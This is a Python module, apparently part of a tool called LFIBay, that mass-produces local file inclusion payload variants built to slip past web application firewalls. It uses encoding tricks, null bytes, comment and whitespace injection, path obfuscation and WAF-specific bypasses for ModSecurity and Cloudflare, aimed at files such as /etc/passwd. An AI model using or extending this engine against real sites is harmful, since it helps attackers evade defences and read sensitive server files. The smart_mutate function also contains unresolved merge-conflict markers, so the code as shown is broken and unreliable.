"""
LFIBay - Payload Mutation Engine
Automatically generate payload variations for WAF bypass
"""

import urllib.parse
import random
import re


def charset_substitution(payload):
    """
    Replace characters with encoded alternatives
    Args:
        payload: Original payload string
    Returns: List of mutated payloads
    """
    mutations = []
    
    # Single URL encoding
    mutations.append(urllib.parse.quote(payload))
    
    # Encode only slashes
    mutations.append(payload.replace('/', '%2f'))
    mutations.append(payload.replace('/', '%2F'))
    
    # Encode only dots
    mutations.append(payload.replace('.', '%2e'))
    mutations.append(payload.replace('.', '%2E'))
    
    # Encode backslashes (Windows)
    if '\\' in payload:
        mutations.append(payload.replace('\\', '%5c'))
        mutations.append(payload.replace('\\', '%5C'))
    
    # Mixed encoding (dots and slashes)
    mixed = payload.replace('.', '%2e').replace('/', '%2f')
    mutations.append(mixed)
    
    return mutations


def case_variation(payload):
    """
    Generate case variations for case-insensitive systems
    Args:
        payload: Original payload string
    Returns: List of case-varied payloads
    """
    mutations = []
    
    # All uppercase
    mutations.append(payload.upper())
    
    # All lowercase
    mutations.append(payload.lower())
    
    # Alternating case
    alternating = ''
    for i, char in enumerate(payload):
        if i % 2 == 0:
            alternating += char.upper()
        else:
            alternating += char.lower()
    mutations.append(alternating)
    
    # Random case (weighted towards original)
    random_case = ''
    for char in payload:
        if random.random() < 0.3:  # 30% chance to flip case
            random_case += char.swapcase()
        else:
            random_case += char
    mutations.append(random_case)
    
    return mutations


def mixed_encoding(payload):
    """
    Combine multiple encoding techniques
    Args:
        payload: Original payload string
    Returns: List of mixed-encoded payloads
    """
    mutations = []
    
    # Double URL encoding
    encoded_once = urllib.parse.quote(payload)
    mutations.append(urllib.parse.quote(encoded_once))
    
    # Triple URL encoding (for specific WAFs)
    encoded_twice = urllib.parse.quote(encoded_once)
    mutations.append(urllib.parse.quote(encoded_twice))
    
    # Mix of encoded and non-encoded characters
    mixed = ''
    for i, char in enumerate(payload):
        if i % 2 == 0 and char in ['/', '\\', '.']:
            mixed += urllib.parse.quote(char)
        else:
            mixed += char
    mutations.append(mixed)
    
    # Unicode encoding for slashes
    mutations.append(payload.replace('/', '%c0%af'))
    mutations.append(payload.replace('/', '%e0%80%af'))
    
    # Overlong UTF-8 encoding for dots
    mutations.append(payload.replace('.', '%c0%ae'))
    
    return mutations


def comment_injection(payload):
    """
    Inject comments for pattern breaking
    Args:
        payload: Original payload string
    Returns: List of comment-injected payloads
    """
    mutations = []
    
    # PHP comment injection
    if 'etc' in payload.lower():
        mutations.append(payload.replace('etc', 'e/**/tc'))
        mutations.append(payload.replace('etc', 'e<!-- -->tc'))
        mutations.append(payload.replace('etc', 'e<>tc'))
    
    if 'passwd' in payload.lower():
        mutations.append(payload.replace('passwd', 'p/**/asswd'))
        mutations.append(payload.replace('passwd', 'pass/**/wd'))
    
    if 'windows' in payload.lower():
        mutations.append(payload.replace('windows', 'win/**/dows'))
        mutations.append(payload.replace('windows', 'wind<!-- -->ows'))
    
    # Generic comment injection for paths
    if '/' in payload:
        parts = payload.split('/')
        if len(parts) > 2:
            # Inject comment between path segments
            injected = '/'.join(parts[:2]) + '/**/' + '/'.join(parts[2:])
            mutations.append(injected)
    
    return mutations


def whitespace_injection(payload):
    """
    Add whitespace for signature evasion
    Args:
        payload: Original payload string
    Returns: List of whitespace-injected payloads
    """
    mutations = []
    
    # Space after slash
    mutations.append(payload.replace('/', '/ '))
    
    # Space before slash
    mutations.append(payload.replace('/', ' /'))
    
    # Tab characters
    mutations.append(payload.replace('/', '/\t'))
    
    # Multiple spaces
    mutations.append(payload.replace('/', '/  '))
    
    # Space in filename
    if 'passwd' in payload:
        mutations.append(payload.replace('passwd', 'pass wd'))
        mutations.append(payload.replace('passwd', 'pass  wd'))
    
    if 'win.ini' in payload:
        mutations.append(payload.replace('win.ini', 'win .ini'))
        mutations.append(payload.replace('win.ini', 'win. ini'))
    
    return mutations


def null_byte_variations(payload):
    """
    Generate null byte variations
    Args:
        payload: Original payload string
    Returns: List of null byte payloads
    """
    mutations = []
    
    # Standard null byte
    mutations.append(f"{payload}%00")
    mutations.append(f"{payload}%00.jpg")
    mutations.append(f"{payload}%00.php")
    mutations.append(f"{payload}%00.txt")
    
    # Double encoded null byte
    mutations.append(f"{payload}%2500")
    mutations.append(f"{payload}%2500.jpg")
    
    # Double null bytes
    mutations.append(f"{payload}%00%00")
    
    # Alternative null byte representations
    mutations.append(f"{payload}\\x00")
    mutations.append(f"{payload}%u0000")
    
    return mutations


def path_obfuscation(payload):
    """
    Advanced path obfuscation techniques
    Args:
        payload: Original payload string
    Returns: List of obfuscated payloads
    """
    mutations = []
    
    # Dot variations
    if '../' in payload:
        mutations.append(payload.replace('../', '....//'))
        mutations.append(payload.replace('../', '..../'))
        mutations.append(payload.replace('../', '.././'))
        mutations.append(payload.replace('../', '.../'))
    
    # Slash variations
    mutations.append(payload.replace('/', '//'))
    mutations.append(payload.replace('/', '///'))
    
    # Missing slash technique
    if '/' in payload:
        mutations.append(payload.replace('/', '/./'))
        mutations.append(payload.replace('/', '/././'))
    
    # Backslash double (Windows)
    if '\\' in payload:
        mutations.append(payload.replace('\\', '\\\\'))
        mutations.append(payload.replace('\\', '\\\\\\\\'))
    
    return mutations


def mutate_single(payload):
    """
    Generate all mutations for a single payload
    Args:
        payload: Original payload string
    Returns: List of all mutated variations
    """
    all_mutations = [payload]  # Always include original
    
    # Apply each mutation technique
    all_mutations.extend(charset_substitution(payload))
    all_mutations.extend(mixed_encoding(payload))
    all_mutations.extend(comment_injection(payload))
    all_mutations.extend(whitespace_injection(payload))
    all_mutations.extend(path_obfuscation(payload))
    
    # Add null byte variations (if not already present)
    if '%00' not in payload and '\\x00' not in payload:
        all_mutations.extend(null_byte_variations(payload))
    
    # Add case variations for Windows paths
    if 'windows' in payload.lower() or 'win.ini' in payload.lower():
        all_mutations.extend(case_variation(payload))
    
    # Remove duplicates while preserving order
    seen = set()
    unique_mutations = []
    for mutation in all_mutations:
        if mutation not in seen:
            seen.add(mutation)
            unique_mutations.append(mutation)
    
    return unique_mutations


def mutate_all(payloads, max_mutations_per_payload=15):
    """
    Generate mutations for all payloads
    Args:
        payloads: List of original payloads
        max_mutations_per_payload: Maximum mutations to keep per payload
    Returns: List of all mutated payloads
    """
    all_mutated = []
    
    for payload in payloads:
        mutations = mutate_single(payload)
        
        # Limit mutations per payload to avoid explosion
        if len(mutations) > max_mutations_per_payload:
            # Keep original + random sample of mutations
            selected = [payload] + random.sample(mutations[1:], max_mutations_per_payload - 1)
            all_mutated.extend(selected)
        else:
            all_mutated.extend(mutations)
    
    return all_mutated


<<<<<<< Updated upstream
def smart_mutate(payloads, target_detected=None):
    """
    Intelligently mutate based on detected target characteristics
    Args:
        payloads: List of original payloads
        target_detected: Dictionary with detection info (os, waf, etc.)
    Returns: List of targeted mutations
    """
    if target_detected is None:
=======
def smart_mutate(payloads, target_detected=None, max_mutations=10):
    """Smart mutation based on target detection"""
    # TODO: add ML-based mutation selection?
    if not target_detected:
>>>>>>> Stashed changes
        target_detected = {}
    
    mutations = []
    
    for payload in payloads:
        # Always include original
        mutations.append(payload)
        
        # OS-specific mutations
        if target_detected.get('os') == 'windows':
            mutations.extend(case_variation(payload))
            if '/' in payload:
                # Convert to backslashes for Windows
                mutations.append(payload.replace('/', '\\'))
        
        # WAF-specific mutations
        if target_detected.get('waf'):
            waf_type = target_detected.get('waf_type', 'generic')
            
            if waf_type in ['modsecurity', 'generic']:
                # Use advanced encoding
                mutations.extend(mixed_encoding(payload))
                mutations.extend(comment_injection(payload))
            
            if waf_type == 'cloudflare':
                # Cloudflare specific bypasses
                mutations.extend(whitespace_injection(payload))
                mutations.extend(path_obfuscation(payload))
        
        # Default: use charset substitution for all
        mutations.extend(charset_substitution(payload)[:5])  # Limit to 5
    
    # Remove duplicates
    return list(dict.fromkeys(mutations))


def get_mutation_stats(original_count, mutated_count):
    """
    Get statistics about mutation process
    Args:
        original_count: Number of original payloads
        mutated_count: Number after mutation
    Returns: Dictionary with stats
    """
    return {
        'original_count': original_count,
        'mutated_count': mutated_count,
        'increase': mutated_count - original_count,
        'multiplier': round(mutated_count / original_count, 2) if original_count > 0 else 0
    }
